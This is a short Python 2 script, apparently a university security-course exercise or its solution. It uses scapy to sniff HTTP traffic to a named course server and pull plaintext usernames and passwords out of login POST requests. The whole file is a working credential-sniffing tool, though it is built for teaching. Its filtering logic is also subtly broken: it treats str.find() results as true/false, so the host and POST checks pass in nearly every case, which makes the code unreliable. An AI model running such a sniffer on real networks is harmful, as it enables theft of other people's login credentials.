import scapy.all as S
import urlparse
import re


WEBSITE = 'infosec.cs.tau.ac.il'


def parse_packet(packet):
    """
    If this is a login request to the course website, return the username
    and password as a tuple => ('123456789', 'opensesame'). Otherwise,
    return None.

    Note: You can assume the entire HTTP request fits within one packet.
    """

    packet_str = str(packet)
    # filter only POST requests - sending the credentials to the server
    if packet_str.find(WEBSITE) and packet_str.find("POST"):
        match = re.search('username=.*&password=.*', packet_str)
        if match:
            data = match.group(0)
            data_lst = data.split('&')
            username_str, password_str = data_lst[0], data_lst[1]
            username = username_str.split("=")[1]
            password = password_str.split("=")[1]
            return (username, password)
    return None


def packet_filter(packet):
    """
    Filter to keep only HTTP traffic (port 80) from the client to the server.
    """
    if S.IP in packet and S.TCP in packet and S.Raw in packet:
        return packet[S.IP].dst == "132.66.11.65" and packet[S.TCP].dport == 80


def main(args):
    # WARNING: DO NOT EDIT THIS FUNCTION!
    if '--help' in args:
        print 'Usage: %s [<path/to/recording.pcap>]' % args[0]

    elif len(args) < 2:
        # Sniff packets and apply our logic.
        S.sniff(lfilter=packet_filter, prn=parse_packet)

    else:
        # Else read the packets from a file and apply the same logic.
        for packet in S.rdpcap(args[1]):
            if packet_filter(packet):
                print parse_packet(packet)


if __name__ == '__main__':
    import sys
    main(sys.argv)
